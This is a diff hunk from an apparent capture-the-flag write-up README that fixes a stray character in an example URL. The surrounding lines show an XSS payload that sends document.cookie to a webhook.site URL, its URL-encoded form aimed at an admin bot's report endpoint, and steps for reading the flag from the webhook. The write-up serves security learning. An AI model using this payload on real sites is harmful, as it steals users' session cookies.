@@ -133,7 +133,7 @@ by looking at the bot.py source code of the bot admin we will notice that this i
 <script nonce="XXXXXX">fetch("https://webhook.site/zzzz...yyyy/flag?flag="+document.cookie,{{"mode":"no-cors"}})</script>
 ```
 url encode this XSS payload using any online urlencoder then put it in the `msg` parameter and put the userId that we got in the `userId`  parameter (this step is so important)
-* final payload should look something like this: `?http://127.0.0.1:8080/report?msg=%3Cscript%20nonce%3D%22XXXXXX%22%3Efetch%28%22https%3A%2F%2Fwebhook%2Esite%2Fzzzz%2E%2E%2Eyyyy%2Fflag%3Fflag%3D%22%2Bdocument%2Ecookie%2C%7B%7B%22mode%22%3A%22no%2Dcors%22%7D%7D%29%3C%2Fscript%3E&userId=52b73ef5%2D7f86%2D4892%2Dbd39%2D120ed0269c51
+* final payload should look something like this: `http://127.0.0.1:8080/report?msg=%3Cscript%20nonce%3D%22XXXXXX%22%3Efetch%28%22https%3A%2F%2Fwebhook%2Esite%2Fzzzz%2E%2E%2Eyyyy%2Fflag%3Fflag%3D%22%2Bdocument%2Ecookie%2C%7B%7B%22mode%22%3A%22no%2Dcors%22%7D%7D%29%3C%2Fscript%3E&userId=52b73ef5%2D7f86%2D4892%2Dbd39%2D120ed0269c51
 * full payload generator will be in the [exploit.py](exploit.py)
 * submit that url to the admin bot
 * and then get the flag from the webhook
